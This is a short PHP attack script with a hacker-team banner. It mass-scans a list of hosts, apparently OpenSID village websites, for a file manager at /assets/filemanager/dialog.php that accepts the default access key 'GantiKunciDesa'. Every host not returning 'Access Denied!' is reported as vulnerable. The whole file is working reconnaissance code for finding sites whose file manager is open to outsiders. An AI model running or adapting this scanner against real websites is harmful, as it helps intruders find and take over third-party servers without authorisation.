<?php


echo "
  ___ ___ __  __                    
 | _ \ __|  \/  |        Author : MarsHall           
 |   / _|| |\/| |        Team   : Xai Syndicate           
 |_|_\_| |_|  |_|      ___ ___ ___  
  / _ \ _ __  ___ _ _ / __|_ _|   \ 
 | (_) | '_ \/ -_) ' \\__ \| || |) |
  \___/| .__/\___|_||_|___/___|___/ 
       |_|                          
";
echo "\n";
echo "Note : Yang tidak muncul berarti not vuln\n\n";

$list = file_get_contents("sid.txt");
$sl = explode("\n", $list);

foreach($sl as $ht){

$url = "$ht/assets/filemanager/dialog.php?akey=GantiKunciDesa";
$get = file_get_contents($url);

if ($get == 'Access Denied!'){     
   //  echo "$ht > Not Vuln\n"; 
} else {
     echo "$ht > Vuln\n";
}
}

?>